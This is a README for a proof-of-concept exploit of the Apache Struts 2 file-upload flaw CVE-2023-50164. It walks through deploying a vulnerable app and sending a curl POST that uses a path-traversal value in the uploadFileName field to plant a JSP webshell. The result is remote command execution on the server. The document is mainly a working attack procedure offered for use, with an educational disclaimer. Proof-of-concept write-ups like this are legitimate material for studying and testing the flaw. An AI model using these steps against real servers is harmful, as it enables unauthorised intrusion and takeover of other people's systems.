A StrutsShell Proof of Concept (PoC)

This repository contains a proof of concept (PoC) for the StrutsShell vulnerability (CVE-2023-50164), a critical issue discovered in December 2023 and affecting Apache Struts 2 versions 2.0.0 - 2.3.37, 2.5.0 - 2.5.32 and 6.0.0 - 6.2.0. This flaw allows attackers to manipulate file paths during uploads, which can lead to saving files to arbitrary directories and, under certain circumstances, to Remote Code Execution. This PoC is provided for educational and testing purposes to help understand the vulnerability and its potential impact.

**Disclaimer**: This PoC should only be used in controlled environments for educational and defensive purposes. Unauthorized use of this PoC to exploit or cause harm is illegal and unethical.

This guide will explain how to set-up and execute a PoC, please use it responsibly.

1. Deploy  the vulnerable Java application (UploadFileWeb) locally using your preferred technology, e.g. Apache Tomcat, Jetty, Docker image, etc.
2. Place the webshell.jsp file in the directory where you will perform the PoC (upload POST request in step 3).
3. Execute the following curl command to make a POST request with the content of the webshell.jsp but modifying the parameter uploadFileName including the path traversal payload:

```
curl http://localhost:8080/UploadFileWeb/upload.action -F "Upload=@./webshell-advanced.jsp" -F "uploadFileName=../../path/to/webapp/dummy.jsp" --trace-ascii /dev/stdout
```

**Note**: if you are performing the attack from another machine, make sure to put the correct IP and port where the application is running. In "uploadFileName", substitute /path/to/webapp/ with the actual path where your application serves files, e.g. if you are using Tomcat in Eclipse, this will be something like: /home/user/eclipse-workspace/UploadFileWeb/src/main/webapp/ 

5. Once the upload has been completed, access the dummy.jsp (Webshell file) that should be accessible via browser: http://localhost:8080/UploadFileWeb/dummy.jsp
7. A webshell will be loaded and could be used as interactive console to control the server (RCE).

